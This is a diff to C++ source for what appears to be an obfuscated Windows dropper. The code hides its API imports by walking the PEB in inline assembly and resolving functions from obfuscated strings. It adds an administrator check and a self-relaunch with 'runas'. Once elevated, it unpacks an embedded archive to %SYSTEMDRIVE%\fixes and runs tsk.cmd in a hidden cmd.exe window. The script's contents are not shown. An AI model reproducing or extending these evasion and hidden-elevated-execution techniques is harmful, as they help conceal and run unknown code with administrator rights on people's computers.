@@ -144,7 +144,7 @@ namespace obfs {
 
 static void *ppeb=NULL;
 __fdecl void dbg();
-static HINSTANCE huser32,hshell32,hgdi32,hkernel32;
+static HINSTANCE huser32,hshell32,hgdi32,hadvapi32,hkernel32,hntdll;
 
 #define TIME_TYPE LARGE_INTEGER
 #define GET_TIME(s) (QueryPerformanceCounter(&(s)))
@@ -227,9 +227,13 @@ typedef volatile HGLOBAL (WINAPI *LRS)(HMODULE,HRSRC); static LRS lrs;
 typedef volatile LPVOID (WINAPI *LCR)(HGLOBAL); static LCR lcr;
 typedef volatile DWORD (WINAPI *GEV)(LPCSTR,LPSTR,DWORD); static GEV gev;
 typedef volatile void (WINAPI *SLE)(DWORD); static SLE sle;
+typedef volatile NTSTATUS (WINAPI *RGV)(PRTL_OSVERSIONINFOEXW); static RGV rgv;
+typedef volatile BOOL (WINAPI *AAS)(PSID_IDENTIFIER_AUTHORITY,BYTE,DWORD,DWORD,DWORD,DWORD,DWORD,DWORD,DWORD,DWORD,PSID*); static AAS aas;
+typedef volatile BOOL (WINAPI *CTM)(HANDLE,PSID,PBOOL); static CTM ctm;
+typedef volatile PVOID (WINAPI *FSD)(PSID); static FSD fsd;
+typedef volatile DWORD (WINAPI *GMF)(HMODULE,LPSTR,DWORD); static GMF gmf;
 
 extern "C" PVOID WINAPI RtlGetCurrentPeb();
-extern "C" NTSTATUS WINAPI RtlGetVersion(PRTL_OSVERSIONINFOEXW lpVersionInformation);
 
 __fdecl uint16_t strlen_i(const char *src){
   uint16_t i=0;
@@ -239,7 +243,7 @@ __fdecl uint16_t strlen_i(const char *src){
   return i;
 };
 
-__fdecl void get_module_name(HMODULE m,char *s){
+__fdecl void get_module_name(HMODULE m,char *l){
   ULONG_PTR moduleBase;
   PIMAGE_DOS_HEADER dosHeader;
   PIMAGE_NT_HEADERS ntHeaders;
@@ -248,10 +252,10 @@ __fdecl void get_module_name(HMODULE m,char *s){
   dosHeader=(PIMAGE_DOS_HEADER)moduleBase;
   ntHeaders=(PIMAGE_NT_HEADERS)(moduleBase+dosHeader->e_lfanew);
   eatDirectory=(PIMAGE_EXPORT_DIRECTORY)(moduleBase+ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-  char *n=(char*)(moduleBase+eatDirectory->Name);
+  char *n=(char*)(moduleBase+eatDirectory->Name),*s=l;
   for(uint8_t i=0;i<13;i++){
     if(*s!=((*n>64 && *n<97)?(*n+32):*n)){
-      MessageBoxA(0,"Ошибка загрузки библиотек!","Ошибка!",MB_ICONERROR|MB_OK);
+      MessageBoxA(0,o("Ошибка загрузки библиотеки!"),l,MB_ICONERROR|MB_OK);
       ExitProcess(1);
     };
     if(!*n || !*s) break;
@@ -262,13 +266,14 @@ __fdecl void get_module_name(HMODULE m,char *s){
 
 __fdecl void get_handles(){
   __asm__ volatile(
-    "mov %1       , %0\n\t"
+    "mov %2       , %0\n\t"
     "mov 0x0C(%0) , %0\n\t"
     "mov 0x14(%0) , %0\n\t"
     "mov (%0)     , %0\n\t"
+    "mov 0x10(%0) , %1\n\t"
     "mov (%0)     , %0\n\t"
     "mov 0x10(%0) , %0\n\t"
-    : "=r"(hkernel32): "r" (ppeb));
+    : "=r"(hkernel32), "=r" (hntdll) : "r" (ppeb));
 };
 
 __fdecl void *gpa(HMODULE m,const char *f){
@@ -798,11 +803,27 @@ __fdecl void unarc(char *out){
   };
 }
 
+__fdecl BOOL is_admin(){
+  BOOL result=FALSE;
+  SID_IDENTIFIER_AUTHORITY NtAuthority=SECURITY_NT_AUTHORITY;
+  PSID AdministratorsGroup;
+  result=((AAS)_f(aas))(&NtAuthority,2,SECURITY_BUILTIN_DOMAIN_RID,
+                                  DOMAIN_ALIAS_RID_ADMINS,0,0,0,0,0,0,&AdministratorsGroup);
+  if(result){
+    ((CTM)_f(ctm))(NULL,AdministratorsGroup,&result);
+    ((FSD)_f(fsd))(AdministratorsGroup);
+  };
+  return result;
+}
+
 __fdecl bool iswin10(){
-  OSVERSIONINFOEXW osInfo;
-  osInfo.dwOSVersionInfoSize=sizeof(osInfo);
-  RtlGetVersion(&osInfo);
-  return (uint32_t)osInfo.dwMajorVersion>=10?true:false;
+  if(rgv){
+    OSVERSIONINFOEXW osInfo;
+    osInfo.dwOSVersionInfoSize=sizeof(osInfo);
+    rgv(&osInfo);
+    return (uint32_t)osInfo.dwMajorVersion>=10?true:false;
+  };
+  return false;
 };
 
 #define data_res 0x10
@@ -856,6 +877,7 @@ __fdecl void init(){
   ppeb=RtlGetCurrentPeb();
   get_handles();
   init_tnumbers();
+  get_module_name(hntdll,o("ntdll.dll"));
   get_module_name(hkernel32,o("kernel32.dll"));
   sle=(SLE)gpa(hkernel32,o("SetLastError"));
   if(sle) sle(0);
@@ -888,6 +910,7 @@ __fdecl void init(){
   _s(dll_u,"User32",6);
   _s(dll_s,"Shell32",7);
   _s(dll_g,"Gdi32",5);
+  _s(dll_a,"Advapi32",8);
   _s(f0001,"CreateBitmap",12);
   _s(f0002,"CreateCompatibleDC",18);
   _s(f0003,"DeleteDC",8);
@@ -916,26 +939,34 @@ __fdecl void init(){
   _s(f0026,"RegisterWindowMessageA",22);
   _s(f0027,"SendMessageA",12);
   _s(f0028,"CommandLineToArgvW",18);
-  _s(f0029,"LoadCursorA",11);
-  _s(f0030,"WriteFile",9);
-  _s(f0031,"CreateDirectoryA",16);
-  _s(f0032,"GetFileAttributesA",18);
-  _s(f0033,"CreateFileA",11);
-  _s(f0034,"GetCommandLineW",15);
-  _s(f0035,"GetEnvironmentVariableA",23);
+  _s(f0029,"RtlGetVersion",13);
+  _s(f0030,"LoadCursorA",11);
+  _s(f0031,"WriteFile",9);
+  _s(f0032,"CreateDirectoryA",16);
+  _s(f0033,"GetFileAttributesA",18);
+  _s(f0034,"CreateFileA",11);
+  _s(f0035,"GetCommandLineW",15);
+  _s(f0036,"GetEnvironmentVariableA",23);
+  _s(f0037,"AllocateAndInitializeSid",24);
+  _s(f0038,"CheckTokenMembership",20);
+  _s(f0039,"FreeSid",7);
+  _s(f0040,"GetModuleFileNameA",18);
   seed=timebits();
   flib=(FLIB)get_fn_ptr(hkernel32,f0007);
   lla=(LLA)get_fn_ptr(hkernel32,f0025);
   hgdi32=((LLA)_f(lla))(dll_g);
   huser32=((LLA)_f(lla))(dll_u);
   hshell32=((LLA)_f(lla))(dll_s);
+  hadvapi32=((LLA)_f(lla))(dll_a);
+  rgv=(RGV)gpa(hntdll,f0029);
   if (!iswin10()){ if(iMutex) CloseHandle(iMutex); ExitProcess(0); };
-  wfe=(WFE)get_fn_ptr(hkernel32,f0030);
-  cda=(CDA)get_fn_ptr(hkernel32,f0031);
-  gfa=(GFA)get_fn_ptr(hkernel32,f0032);
-  cfa=(CFA)get_fn_ptr(hkernel32,f0033);
-  gcw=(GCW)get_fn_ptr(hkernel32,f0034);
-  gev=(GEV)get_fn_ptr(hkernel32,f0035);
+  wfe=(WFE)get_fn_ptr(hkernel32,f0031);
+  cda=(CDA)get_fn_ptr(hkernel32,f0032);
+  gfa=(GFA)get_fn_ptr(hkernel32,f0033);
+  cfa=(CFA)get_fn_ptr(hkernel32,f0034);
+  gcw=(GCW)get_fn_ptr(hkernel32,f0035);
+  gev=(GEV)get_fn_ptr(hkernel32,f0036);
+  gmf=(GMF)get_fn_ptr(hkernel32,f0040);
   awr=(AWR)get_fn_ptr(huser32,f0013);
   bep=(BEP)get_fn_ptr(huser32,f0014);
   epa=(EPA)get_fn_ptr(huser32,f0015);
@@ -950,7 +981,7 @@ __fdecl void init(){
   uwi=(UWI)get_fn_ptr(huser32,f0024);
   rwma=(RWMA)get_fn_ptr(huser32,f0026);
   sma=(SMA)get_fn_ptr(huser32,f0027);
-  lca=(LCA)get_fn_ptr(huser32,f0029);
+  lca=(LCA)get_fn_ptr(huser32,f0030);
   cbmp=(CBMP)get_fn_ptr(hgdi32,f0001);
   cdc=(CCDC)get_fn_ptr(hgdi32,f0002);
   ddc=(DDC)get_fn_ptr(hgdi32,f0003);
@@ -963,6 +994,9 @@ __fdecl void init(){
   mte=(MTE)get_fn_ptr(hgdi32,f0012);
   sea=(SEA)get_fn_ptr(hshell32,f0006);
   cltaw=(CLTAW)get_fn_ptr(hshell32,f0028);
+  aas=(AAS)get_fn_ptr(hadvapi32,f0037);
+  ctm=(CTM)get_fn_ptr(hadvapi32,f0038);
+  fsd=(FSD)get_fn_ptr(hadvapi32,f0039);
 };
 
 extern "C" void __stdcall start(){
@@ -981,48 +1015,65 @@ extern "C" void __stdcall start(){
     LPWSTR *argv=((CLTAW)_f(cltaw))(((GCW)_f(gcw))(),&c);
     if(argv){
       if(c>1){
-        _s(argcmd,"start",5);
-        char *a=(char *)argcmd;
+        char *a=(char *)imutex;
         wchar_t *b=argv[1];
         while(*a && *b && (uint16_t)*a==(uint16_t)*b){
           a++;
           b++;
         };
-        if(*a==0 && *b==0) dlg_ret=1;
+        if(*a==0 && *b==0){
+          if(is_admin()) dlg_ret=1;
+          else ExitProcess(0);
+        };
       };
       LocalFree(argv);
-    };
+    }
+    else ExitProcess(1);
     if(!dlg_ret) null_window(0);
     dbg();
     if(dlg_ret){
-      _s(drv_e,"SYSTEMDRIVE",11);
       _s(sea_m,"runas",5);
       _s(sea_c,"cmd.exe",7);
-      _s(sea_o,"/c %SYSTEMDRIVE%\\fixes\\tsk.cmd",30);
-      _s(sea_r,"/c \"rd /s /q %SYSTEMDRIVE%\\fixes\"",33);
+      SHELLEXECUTEINFO ShExecInfo;
+      ShExecInfo.cbSize=sizeof(SHELLEXECUTEINFO);
+      ShExecInfo.fMask=0;
+      ShExecInfo.hwnd=NULL;
+      ShExecInfo.lpDirectory=NULL;
+      ShExecInfo.nShow=0;
+      ShExecInfo.hInstApp=0;
+      ShExecInfo.lpVerb=sea_m;
       char *path=(char *)LocalAlloc(LMEM_ZEROINIT,MAX_PATH);
       if(path){
-        ((GEV)_f(gev))(drv_e,path,257);
-        path[strlen_i(path)+1]=0;
-        path[strlen_i(path)]='/';
-        bytes2uint(res_size);
-        init_unpack(res_size);
-        unarc(path);
-        SHELLEXECUTEINFO ShExecInfo;
-        ShExecInfo.cbSize=sizeof(SHELLEXECUTEINFO);
-        ShExecInfo.fMask=0;
-        ShExecInfo.hwnd=NULL;
-        ShExecInfo.lpVerb=sea_m;
-        ShExecInfo.lpFile=sea_c;
-        ShExecInfo.lpParameters=sea_o;
-        ShExecInfo.lpDirectory=NULL;
-        ShExecInfo.nShow=0;
-        ShExecInfo.hInstApp=0;
-        if(((SEA)_f(sea))(&ShExecInfo)==FALSE){
+        if(is_admin()){
+          ShExecInfo.lpFile=sea_c;
+          _s(drv_e,"SYSTEMDRIVE",11);
+          _s(sea_o,"/c %SYSTEMDRIVE%\\fixes\\tsk.cmd",30);
+          _s(sea_r,"/c \"rd /s /q %SYSTEMDRIVE%\\fixes\"",33);
+          ((GEV)_f(gev))(drv_e,path,257);
+          path[strlen_i(path)+1]=0;
+          path[strlen_i(path)]='/';
           res_size=0;
-          ShExecInfo.fMask=SEE_MASK_NOASYNC;
-          ShExecInfo.lpVerb=NULL;
-          ShExecInfo.lpParameters=sea_r;
+          bytes2uint(res_size);
+          init_unpack(res_size);
+          unarc(path);
+          ShExecInfo.lpFile=sea_c;
+          ShExecInfo.lpParameters=sea_o;
+          ShExecInfo.fMask=0;
+          if(((SEA)_f(sea))(&ShExecInfo)==FALSE){
+            ShExecInfo.fMask=SEE_MASK_NOASYNC;
+            ShExecInfo.lpVerb=NULL;
+            ShExecInfo.lpParameters=sea_r;
+            ((SEA)_f(sea))(&ShExecInfo);
+          };
+        }
+        else{
+          ((GMF)_f(gmf))(NULL,path,MAX_PATH);
+          ShExecInfo.lpFile=path;
+          ShExecInfo.lpParameters=imutex;
+          if(iMutex){
+            CloseHandle(iMutex);
+            iMutex=0;
+          };
           ((SEA)_f(sea))(&ShExecInfo);
         };
         LocalFree(path);
